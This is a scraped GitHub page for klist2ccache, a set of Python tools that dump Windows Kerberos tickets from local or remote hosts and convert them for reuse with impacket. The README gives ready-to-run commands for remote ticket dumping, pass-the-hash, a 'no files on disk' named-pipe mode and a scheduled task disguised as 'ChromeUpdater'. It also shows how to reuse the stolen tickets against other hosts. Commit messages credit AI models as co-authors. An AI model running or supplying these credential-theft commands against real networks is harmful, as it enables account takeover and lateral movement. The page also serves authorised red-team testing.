# https://github.com/jakeotte/klist2ccache

[Skip to content](https://github.com/jakeotte/klist2ccache#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/jakeotte/klist2ccache) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/jakeotte/klist2ccache) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/jakeotte/klist2ccache) to refresh your session.Dismiss alert

{{ message }}

[jakeotte](https://github.com/jakeotte)/ **[klist2ccache](https://github.com/jakeotte/klist2ccache)** Public

- [Notifications](https://github.com/login?return_to=%2Fjakeotte%2Fklist2ccache) You must be signed in to change notification settings
- [Fork\\
11](https://github.com/login?return_to=%2Fjakeotte%2Fklist2ccache)
- [Star\\
93](https://github.com/login?return_to=%2Fjakeotte%2Fklist2ccache)


main

[**1** Branch](https://github.com/jakeotte/klist2ccache/branches) [**0** Tags](https://github.com/jakeotte/klist2ccache/tags)

[Go to Branches page](https://github.com/jakeotte/klist2ccache/branches)[Go to Tags page](https://github.com/jakeotte/klist2ccache/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>![jakeotte-armadin](https://avatars.githubusercontent.com/u/307117502?v=4&size=40)![claude](https://avatars.githubusercontent.com/u/81847?v=4&size=40)<br>[jakeotte-armadin](https://github.com/jakeotte/klist2ccache/commits?author=jakeotte-armadin)<br>and<br>[claude](https://github.com/jakeotte/klist2ccache/commits?author=claude)<br>[Fix expiry check from](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512) [#2](https://github.com/jakeotte/klist2ccache/pull/2) [and rework dump/list output](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512)<br>Open commit details<br>3 days agoAug 6, 2026<br>[9d232aa](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512) · 3 days agoAug 6, 2026<br>## History<br>[19 Commits](https://github.com/jakeotte/klist2ccache/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/jakeotte/klist2ccache/commits/main/) 19 Commits |
| [README.md](https://github.com/jakeotte/klist2ccache/blob/main/README.md "README.md") | [README.md](https://github.com/jakeotte/klist2ccache/blob/main/README.md "README.md") | [Credential Guard keys are unexportable: refuse instead of emitting a …](https://github.com/jakeotte/klist2ccache/commit/555afcf89a31d7853cf9f335399fa4a035ea96cd "Credential Guard keys are unexportable: refuse instead of emitting a bad key  The previous commit assumed the CG KerberosKeyWithMetadata blob held a cleartext key at offset 28 and exported it. It does not: both opaque regions in the blob are 48 bytes (a 32-byte secret block-aligned + padding), i.e. the session key is wrapped/encrypted. Under Credential Guard the key lives in the secure kernel (VTL1) and the unwrap key never leaves it, so the cleartext key cannot be recovered offline. Feeding the wrapped bytes into a ccache produced KRB_AP_ERR_BAD_INTEGRITY.  Stop extracting offset-28 bytes on the CG path. Instead detect the CG layout and refuse with a clear message (klist2ccache exits non-zero; klistremote/klistwinrm skip the account) so the failure is loud rather than a plausible-looking but unusable ccache. Non-CG SYSTEM blobs and raw-key paths are unchanged. README updated to explain the limitation.  Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>") | 2 months agoJun 30, 2026 |
| [klist2ccache.py](https://github.com/jakeotte/klist2ccache/blob/main/klist2ccache.py "klist2ccache.py") | [klist2ccache.py](https://github.com/jakeotte/klist2ccache/blob/main/klist2ccache.py "klist2ccache.py") | [Credential Guard keys are unexportable: refuse instead of emitting a …](https://github.com/jakeotte/klist2ccache/commit/555afcf89a31d7853cf9f335399fa4a035ea96cd "Credential Guard keys are unexportable: refuse instead of emitting a bad key  The previous commit assumed the CG KerberosKeyWithMetadata blob held a cleartext key at offset 28 and exported it. It does not: both opaque regions in the blob are 48 bytes (a 32-byte secret block-aligned + padding), i.e. the session key is wrapped/encrypted. Under Credential Guard the key lives in the secure kernel (VTL1) and the unwrap key never leaves it, so the cleartext key cannot be recovered offline. Feeding the wrapped bytes into a ccache produced KRB_AP_ERR_BAD_INTEGRITY.  Stop extracting offset-28 bytes on the CG path. Instead detect the CG layout and refuse with a clear message (klist2ccache exits non-zero; klistremote/klistwinrm skip the account) so the failure is loud rather than a plausible-looking but unusable ccache. Non-CG SYSTEM blobs and raw-key paths are unchanged. README updated to explain the limitation.  Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>") | 2 months agoJun 30, 2026 |
| [klistremote.py](https://github.com/jakeotte/klist2ccache/blob/main/klistremote.py "klistremote.py") | [klistremote.py](https://github.com/jakeotte/klist2ccache/blob/main/klistremote.py "klistremote.py") | [Fix expiry check from](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512 "Fix expiry check from #2 and rework dump/list output  PR #2 added ticket end/renew reporting and expired-ticket skipping. Three bugs came with it:  * klistwinrm.py called time.time() without importing time -- every dump   died with NameError on the first ticket. * The skip was nested inside `if info[\"renew_till\"]:`. parse_time() returns   0 for an absent field, so non-renewable tickets were never checked and   expired ones got written anyway -- the exact case the PR set out to catch. * parse_time() tags klist's \"(local)\" wallclock as UTC, so its values are   target-local wallclock, not true epochs. Comparing them to time.time()   skewed every check by the UTC offset: valid tickets dropped west of UTC,   expired ones kept east of it.  Expiry now keys off end_time via now_ticket_frame(), which builds \"now\" in the same frame parse_time() uses, so no time import is needed. A ticket past end_time but still within renew_till is written rather than dropped, since the ccache can be renewed.  Output follows PRTremote's convention: [*]/[X] markers, dot-aligned kv rows, unmarked list rows, and a closing summary with the KRB5CCNAME hint. Skipped expired tickets are counted so \"0 ccaches written\" explains itself instead of just exiting 1.  Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>") [#2](https://github.com/jakeotte/klist2ccache/pull/2) [and rework dump/list output](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512 "Fix expiry check from #2 and rework dump/list output  PR #2 added ticket end/renew reporting and expired-ticket skipping. Three bugs came with it:  * klistwinrm.py called time.time() without importing time -- every dump   died with NameError on the first ticket. * The skip was nested inside `if info[\"renew_till\"]:`. parse_time() returns   0 for an absent field, so non-renewable tickets were never checked and   expired ones got written anyway -- the exact case the PR set out to catch. * parse_time() tags klist's \"(local)\" wallclock as UTC, so its values are   target-local wallclock, not true epochs. Comparing them to time.time()   skewed every check by the UTC offset: valid tickets dropped west of UTC,   expired ones kept east of it.  Expiry now keys off end_time via now_ticket_frame(), which builds \"now\" in the same frame parse_time() uses, so no time import is needed. A ticket past end_time but still within renew_till is written rather than dropped, since the ccache can be renewed.  Output follows PRTremote's convention: [*]/[X] markers, dot-aligned kv rows, unmarked list rows, and a closing summary with the KRB5CCNAME hint. Skipped expired tickets are counted so \"0 ccaches written\" explains itself instead of just exiting 1.  Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>") | 3 days agoAug 6, 2026 |
| [klistwinrm.py](https://github.com/jakeotte/klist2ccache/blob/main/klistwinrm.py "klistwinrm.py") | [klistwinrm.py](https://github.com/jakeotte/klist2ccache/blob/main/klistwinrm.py "klistwinrm.py") | [Fix expiry check from](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512 "Fix expiry check from #2 and rework dump/list output  PR #2 added ticket end/renew reporting and expired-ticket skipping. Three bugs came with it:  * klistwinrm.py called time.time() without importing time -- every dump   died with NameError on the first ticket. * The skip was nested inside `if info[\"renew_till\"]:`. parse_time() returns   0 for an absent field, so non-renewable tickets were never checked and   expired ones got written anyway -- the exact case the PR set out to catch. * parse_time() tags klist's \"(local)\" wallclock as UTC, so its values are   target-local wallclock, not true epochs. Comparing them to time.time()   skewed every check by the UTC offset: valid tickets dropped west of UTC,   expired ones kept east of it.  Expiry now keys off end_time via now_ticket_frame(), which builds \"now\" in the same frame parse_time() uses, so no time import is needed. A ticket past end_time but still within renew_till is written rather than dropped, since the ccache can be renewed.  Output follows PRTremote's convention: [*]/[X] markers, dot-aligned kv rows, unmarked list rows, and a closing summary with the KRB5CCNAME hint. Skipped expired tickets are counted so \"0 ccaches written\" explains itself instead of just exiting 1.  Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>") [#2](https://github.com/jakeotte/klist2ccache/pull/2) [and rework dump/list output](https://github.com/jakeotte/klist2ccache/commit/9d232aa480793798633d03a17811a170d03c4512 "Fix expiry check from #2 and rework dump/list output  PR #2 added ticket end/renew reporting and expired-ticket skipping. Three bugs came with it:  * klistwinrm.py called time.time() without importing time -- every dump   died with NameError on the first ticket. * The skip was nested inside `if info[\"renew_till\"]:`. parse_time() returns   0 for an absent field, so non-renewable tickets were never checked and   expired ones got written anyway -- the exact case the PR set out to catch. * parse_time() tags klist's \"(local)\" wallclock as UTC, so its values are   target-local wallclock, not true epochs. Comparing them to time.time()   skewed every check by the UTC offset: valid tickets dropped west of UTC,   expired ones kept east of it.  Expiry now keys off end_time via now_ticket_frame(), which builds \"now\" in the same frame parse_time() uses, so no time import is needed. A ticket past end_time but still within renew_till is written rather than dropped, since the ccache can be renewed.  Output follows PRTremote's convention: [*]/[X] markers, dot-aligned kv rows, unmarked list rows, and a closing summary with the KRB5CCNAME hint. Skipped expired tickets are counted so \"0 ccaches written\" explains itself instead of just exiting 1.  Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>") | 3 days agoAug 6, 2026 |
| [requirements.txt](https://github.com/jakeotte/klist2ccache/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/jakeotte/klist2ccache/blob/main/requirements.txt "requirements.txt") | [Add klistwinrm.py, requirements.txt, and --computer flag](https://github.com/jakeotte/klist2ccache/commit/c4d392e0eb1606d1b575f72bdcedc4cbb9b35bd9 "Add klistwinrm.py, requirements.txt, and --computer flag  - klistwinrm.py: new tool that lists/dumps Kerberos TGTs via WinRM   instead of Task Scheduler + SMB; supports all auth types (NTLM,   PTH, Kerberos, AES key, keytab) plus -ssl/-port options - requirements.txt: pywinrm + impacket deps; requests-ntlm2 noted for PTH - klistremote.py + klistwinrm.py: add --computer flag to include   machine account sessions (Kerberos:Network, e.g. HOSTNAME$) - README: document all three tools with usage examples and auth matrix  Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>") | 2 months agoJun 30, 2026 |
| View all files |

## Repository files navigation

# klist

[Permalink: klist](https://github.com/jakeotte/klist2ccache#klist)

Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely via Task Scheduler + SMB. **klistwinrm** does the same thing remotely via WinRM.

All three auto-detect **Credential Guard** hosts. With Credential Guard enabled, `klist tgt -li` emits the session key as a marshalled `KerberosKeyWithMetadata` blob whose key material is **wrapped/encrypted and protected inside the secure kernel (VTL1)** — even SYSTEM only ever sees the protected form. The unwrap key never leaves VTL1, so the cleartext session key **cannot be recovered offline**, and no usable ccache can be built from such a dump.

The tools detect this layout and **refuse with a clear message** rather than emitting a wrong key (which would fail with `KRB_AP_ERR_BAD_INTEGRITY`). To use a TGT from a Credential Guard host, either supply a key obtained another way (`-K <hex>` for `klist2ccache`), or operate the ticket **on the host itself** (e.g. Rubeus `ptt` / `tgtdeleg`) where VTL1 performs the crypto.

* * *

## klist2ccache

[Permalink: klist2ccache](https://github.com/jakeotte/klist2ccache#klist2ccache)

Use when you already have `klist tgt` output from a shell on the target.

```
python klist2ccache.py -i tgt.txt
```

```
[*] Parsed ticket:
    client     : jotter@LUMON.COM
    server     : krbtgt/LUMON.COM@LUMON.COM
    key_type   : 18
    key        : 74f62dc212216c910b<SNIP>
    flags      : 0x40e10000
    start_time : 2026-03-06 17:44:00+00:00
    end_time   : 2026-03-07 03:44:00+00:00
    renew_till : 2026-03-13 08:13:41+00:00
    ticket     : 1229 bytes

[+] ccache written → jotter@LUMON.COM.ccache  (1450 bytes)

[*] Use with impacket:
    export KRB5CCNAME=jotter@LUMON.COM.ccache
    smbclient.py -k -no-pass LUMON/jotter@target
```

* * *

## klistremote

[Permalink: klistremote](https://github.com/jakeotte/klist2ccache#klistremote)

Use when you have credentials to a Windows host and want to dump TGTs without an interactive shell. Same auth format as other Impacket tools.

Default mode writes output to a temp file on the target (`C:\ProgramData\`), reads it via `C$`, then deletes it. Use **`-named-pipes`** to stream over SMB IPC$ instead — no files on disk.

```
# List sessions
python klistremote.py list LUMON/admin@target
python klistremote.py list LUMON/admin@target --computer   # include machine accounts

# Dump all sessions
python klistremote.py dump LUMON/admin@target -o ./ccaches

# Dump a specific session (1-based index from list)
python klistremote.py dump LUMON/admin@target -s 1 -o ./ccaches

# Pass-the-hash
python klistremote.py list -hashes :NTHASH user@target

# Kerberos auth
python klistremote.py list -k LUMON/user@target

# No files on disk (PowerShell named pipe)
python klistremote.py list -named-pipes -hashes :NTHASH user@target
python klistremote.py dump -named-pipes -hashes :NTHASH user@target -o ./ccaches
```

Example — list then dump session 1:

```
$ python klistremote.py list LUMON/admin@10.10.10.5
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Connecting to 10.10.10.5 ...
[*] Enumerating remote Kerberos sessions ...
[*]   task: \ChromeUpdater  file: ChromeUpdater_48291.dat

  Kerberos sessions on 10.10.10.5:

  [1]  LUMON\jotter  0x154333

$ python klistremote.py list LUMON/admin@10.10.10.5 --computer

  Kerberos sessions on 10.10.10.5:

  [1]  LUMON\jotter      0x154333
  [2]  LUMON\jotter-pc$  0x3e4

$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
...
[*] [1/1] LUMON\jotter (0x154333) ...
[*]   -> ./ccaches/jotter@LUMON.COM.ccache
[*] Done. 1 ccache(s) written to ./ccaches
```

```
export KRB5CCNAME=./ccaches/jotter@LUMON.COM.ccache
impacket-smbclient -k -no-pass LUMON/jotter@target
```

* * *

## klistwinrm

[Permalink: klistwinrm](https://github.com/jakeotte/klist2ccache#klistwinrm)

Same as klistremote but uses WinRM instead of Task Scheduler + SMB. Simpler setup — no SMB required, just WinRM (port 5985/5986) open on the target.

```
pip install pywinrm
pip install requests-ntlm2  # optional: pass-the-hash support
```

```
# List sessions
python klistwinrm.py list LUMON/admin@target
python klistwinrm.py list LUMON/admin@target --computer   # include machine accounts

# Dump all sessions
python klistwinrm.py dump LUMON/admin@target -o ./ccaches

# Dump a specific session
python klistwinrm.py dump LUMON/admin@target -s 1 -o ./ccaches

# Pass-the-hash (requires requests-ntlm2)
python klistwinrm.py list -hashes :NTHASH user@target

# Kerberos auth
python klistwinrm.py list -k LUMON/user@target

# HTTPS / custom port
python klistwinrm.py list LUMON/admin@target -ssl
python klistwinrm.py list LUMON/admin@target -port 5986 -ssl
```

| Flag | klistremote | klistwinrm |
| --- | --- | --- |
| Password (NTLM) | ✓ | ✓ |
| `-hashes :NTHASH` (PTH) | ✓ | ✓ (needs requests-ntlm2) |
| `-k` (Kerberos ccache) | ✓ | ✓ |
| `-aesKey` | ✓ | ✓ (get TGT first via getTGT.py) |
| `-keytab` | ✓ | ✓ |
| `--computer` | ✓ | ✓ |
| `-named-pipes` | ✓ | — |
| `-ssl` / `-port` | — | ✓ |

## About

Dump TGTs remotely and convert Windows' klist binary output to ccache.

### Resources

[Readme](https://github.com/jakeotte/klist2ccache#readme-ov-file)

[Activity](https://github.com/jakeotte/klist2ccache/activity)

### Stars

**93** stars

### Watchers

**0** watching

### Forks

[**11** forks](https://github.com/jakeotte/klist2ccache/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fjakeotte%2Fklist2ccache&report=jakeotte+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.